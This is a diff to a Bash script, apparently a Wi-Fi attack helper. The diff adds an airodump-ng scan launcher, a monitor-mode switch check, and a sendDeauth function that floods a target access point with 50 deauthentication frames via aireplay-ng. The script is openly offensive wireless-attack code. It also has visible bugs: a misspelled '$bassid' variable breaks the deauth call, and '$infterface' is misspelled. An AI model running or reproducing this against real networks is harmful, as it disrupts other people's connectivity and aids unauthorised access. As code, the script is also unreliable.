@@ -25,24 +25,46 @@ function banner () {
 Layvth@Github
 "
 }
+#////////////////////////////// airodump-ng running for get access AP //////////////
+run_airodump() {
+    local interface=$1
+    echo -e "${GREEN}[+]~: ${NC}Scanning for Wi-Fi networks on interface $interface..."
+    echo -e "${YELLOW}[+]~: When you Finish Scaning Press [Ctrl + c]"
+    xterm -geometry 100x50 -e "airodump-ng $interface"
+}
+
+
+
+
+
+
+sendDeauth () {
+  local bssid=$1
+  local interface=$2
+  aireplay-ng --deauth 50 -a $bassid $interface
+}
+
+
 check_monitor_mode_support() {
     # Check if the phy80211 directory exists for the interface
     if [ -d "/sys/class/net/$interface/phy80211" ]; then
         echo -e "${GREEN}[*]~: ${NC}Interface ($interface) supports monitor mode !"
-        sleep 2
-        read -p "      Switch ($interface) to monitor mode (yes/no) : " response
-        if [ "$response" == "yes" ] || [ "$response" == "y" ]; then
-            sleep .7
-            airmon-ng start $interface >> /dev/null
-            sleep .5
-            echo -e "${GREEN}[*]~:${NC}$infterface Switched to monitor mode !"
-            echo -e "${GREEN}[+]~:${NC} Tools checking :"
-            sleep 1
+        mode=$(iwconfig $interface | grep "Mode:" | awk '{print $4}')
+        if [ "$mode" = "Mode:Monitor" ]; then
+            echo -e "${GREEN}[+]~:${NC} You on ready in Monitro Mode !"
             checkTools
         else
-            echo "Exit "
-            exit 1
-        fi 
+            read -p "      Switch ($interface) to monitor mode (yes/no) : " response
+            if [ "$response" == "yes" ] || [ "$response" == "y" ]; then
+                sleep .7
+                airmon-ng start $interface >> /dev/null
+                sleep .5
+                echo -e "${GREEN}[*]~:${NC}$infterface Switched to monitor mode !"
+                sleep 1
+                checkTools
+            fi
+        fi
+        
     else
         echo -e "${RED}[!]~:${NC} Interface ($interface) does not support monitor mode"
         sleep .7
@@ -87,16 +109,15 @@ checkRoot () {
     fi
 } 
 checkTools () {
-    # check for aircrack-ng
+    echo -e "${GREEN}[+]~:${NC} Tools checking :"
     air=$(which aircrack-ng)
     if ! [ "$?" -eq "0" ]; then
       echo -e "     Aircrack-ng     ${RED}[Not Found] ${NC}"
-      echo "[!] try [ apt-get install aircrack-ng ] " fi checkRoot
+      echo "[!] try [ apt-get install aircrack-ng ] " 
+      exit 1
     else 
       echo -e "      Aircrack-ng            :${GREEN}[Found]${NC}"
+      run_airodump $interface
     fi
 }
 checkRoot
-
-
-
